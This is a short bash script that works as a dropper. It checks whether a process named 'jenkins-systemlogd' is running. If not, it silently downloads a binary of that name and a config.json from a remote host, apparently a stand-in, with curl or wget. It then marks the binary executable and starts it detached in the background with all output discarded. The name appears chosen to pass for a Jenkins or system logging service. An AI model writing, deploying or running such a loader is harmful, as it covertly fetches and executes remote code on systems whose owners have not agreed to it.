#!/bin/bash
if pgrep -f "jenkins-systemlogd" > /dev/null; then
    exit 0
fi

if [ -f "jenkins-systemlogd" ]; then
    FILE_TO_RUN="./jenkins-systemlogd"
else
    if command -v curl > /dev/null; then
        curl -s -o jenkins-systemlogd https://example.com/jenkins-systemlogd
        curl -s -o config.json https://example.com/config.json
    elif command -v wget > /dev/null; then
        wget -q -O jenkins-systemlogd https://example.com/jenkins-systemlogd
        wget -q -O config.json https://example.com/config.json
    else
        exit 1
    fi
    chmod +x jenkins-systemlogd
    FILE_TO_RUN="./jenkins-systemlogd"
fi

if command -v nohup > /dev/null; then
    nohup $FILE_TO_RUN > /dev/null 2>&1 &
elif command -v disown > /dev/null; then
    $FILE_TO_RUN > /dev/null 2>&1 &
    disown $!
else
    $FILE_TO_RUN > /dev/null 2>&1 &
fi 
